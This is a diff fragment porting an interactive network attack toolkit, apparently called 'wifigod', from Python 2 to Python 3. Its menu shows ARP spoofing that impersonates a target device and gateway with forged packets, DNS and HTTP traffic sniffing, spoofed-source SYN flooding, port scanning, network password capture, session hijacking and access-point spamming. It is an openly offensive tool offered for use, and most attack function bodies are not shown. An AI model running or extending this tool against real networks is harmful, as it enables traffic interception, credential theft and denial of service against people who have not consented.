+		ap_name = input(c.w+"SSID (Name of Network): ")
+		count = input(c.w+"Number of times to Host Network: ")
 		spam_ap(interface,ap_name,int(count))
 	elif(prompt == '7'):
-		interface = raw_input("Network Interface: ")
-		dev_ip = raw_input("Target Device Internal IP: ")
-		gateway_ip = raw_input("Network Gateway IP: ")
+		interface = input("Network Interface: ")
+		dev_ip = input("Target Device Internal IP: ")
+		gateway_ip = input("Network Gateway IP: ")
 		f = open('/proc/sys/net/ipv4/ip_forward', 'w+')
 		f.truncate()
 		f.write('1')
@@ -916,12 +916,12 @@ while True:
 			dev_hostname = resolver.query(addr_of_dev, "PTR")[0]
 		except:
 			dev_hostname = 'unknown'
-		print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{} "+c.d+"("+c.rb+"{}"+c.d+")").format(targ_dev_ip,dev_hostname)
-		print(c.d+"["+c.b+"info"+c.d+"]: Creating Fabricated ARP Packets...")
-		print(c.d+"["+c.b+"info"+c.d+"]: Repeating process for "+c.ob+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
+		print((c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{} "+c.d+"("+c.rb+"{}"+c.d+")").format(targ_dev_ip,dev_hostname))
+		print((c.d+"["+c.b+"info"+c.d+"]: Creating Fabricated ARP Packets..."))
+		print((c.d+"["+c.b+"info"+c.d+"]: Repeating process for "+c.ob+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip))
 	#	print(c.d+"["+c.b+"info"+c.d+"]: Impersonating device "+c.bb+"{}"+c.d+" ("+c.pb+"{}"+c.d+")").format(gateway_mac,gateway_ip)
-		print(c.d+"["+c.b+"info"+c.d+"]: Sending Packets...")
-		print(c.d+"["+c.pb+"*"+c.d+"]: Device Impersonation Successful")
+		print((c.d+"["+c.b+"info"+c.d+"]: Sending Packets..."))
+		print((c.d+"["+c.pb+"*"+c.d+"]: Device Impersonation Successful"))
 		victim_arp_packet = ARP(psrc=gateway_ip,pdst=targ_dev_ip)
 		gateway_arp_packet = ARP(psrc=targ_dev_ip,pdst=gateway_ip)
 		def spcks(pck1,pck2):
@@ -937,32 +937,32 @@ while True:
 			for thread in threads:
 				thread.join()
 	elif(prompt == '8'):
-		print(c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time")
-		interface = raw_input("Network Interface: ")
-		ip_address = raw_input("Target IP Address: ")
+		print((c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time"))
+		interface = input("Network Interface: ")
+		ip_address = input("Target IP Address: ")
 		dns_traffic(interface,ip_address)
 	elif(prompt == '9'):
-		print(c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time")
-		interface = raw_input("Network Interface: ")
-		ip_address = raw_input("Target IP Address: ")
+		print((c.rb+"NOTE: "+c.w+"This Only works when you are using Option #5 at the same time"))
+		interface = input("Network Interface: ")
+		ip_address = input("Target IP Address: ")
 		http_headers(interface,ip_address)
 	elif(prompt == '10'):
-		interface = raw_input("Network Interface: ")
-		ip_source = raw_input("Desired Sender (IP Address to spoof from): ")
-		ip_dest = raw_input("Target IP Address: ")
+		interface = input("Network Interface: ")
+		ip_source = input("Desired Sender (IP Address to spoof from): ")
+		ip_dest = input("Target IP Address: ")
 		ip_source_port = 1024
-		ip_dest_port = raw_input("Target Port: ")
+		ip_dest_port = input("Target Port: ")
 		#message = raw_input("Message to send in SYN Packet: ")
 		message  = "A" * 300
-		thread_count = raw_input("Threads: ")
-		print(c.w+"["+c.b+"info"+c.w+"]: Setting up...")
+		thread_count = input("Threads: ")
+		print((c.w+"["+c.b+"info"+c.w+"]: Setting up..."))
 		subprocess.call("service network-manager restart", shell=True)
 		time.sleep(5)
 		syn_overflow(ip_source,ip_dest,ip_source_port,ip_dest_port,interface,thread_count,message)
 	elif(prompt == '11'):
-		host = raw_input("Target Host: ")
-		start_ = raw_input("Starting Port: ")
-		end_ = raw_input("Ending Port: ")
+		host = input("Target Host: ")
+		start_ = input("Starting Port: ")
+		end_ = input("Ending Port: ")
 		if(int(start_) < 1):
 			print("Error. Starting port must have minimum of 1.")
 		if(int(end_) > 65535):
@@ -970,29 +970,29 @@ while True:
 		if(int(end_) < 65536 and int(start_) > 0):
 			scan_for_ports(host,int(start_),int(end_))
 	elif(prompt == '12'):
-		interface = raw_input("Network Interface: ")
+		interface = input("Network Interface: ")
 		network_password_capture(interface)
 	elif(prompt == '13'):
-		interface = raw_input("Network Interface: ")
+		interface = input("Network Interface: ")
 		print("Net Range example: 192.168.1.0-255")
-		net_range = raw_input("Net Range: ")
-		gateway = raw_input("Network gateway: ")
+		net_range = input("Net Range: ")
+		gateway = input("Network gateway: ")
 		own_network_traffic(interface,net_range,gateway)
 	elif(prompt == '14'):
-		interface = raw_input("Network Interface: ")
+		interface = input("Network Interface: ")
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
 			interface = 'wifigod'
-		device = raw_input("Device Mac: ")
+		device = input("Device Mac: ")
 		extrapolate_trusted_networks(interface,device)
 	elif(prompt == '15'):
-		interface = raw_input("Network Interface: ")
+		interface = input("Network Interface: ")
 		hijack_sessions(interface)
 	elif(prompt == '16'):
 		compromise_network()
 	elif(prompt == '17'):
-		interface = raw_input("Network Interface: ")
+		interface = input("Network Interface: ")
 		if(interface != 'wifigod'):
 			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
 			time.sleep(5)
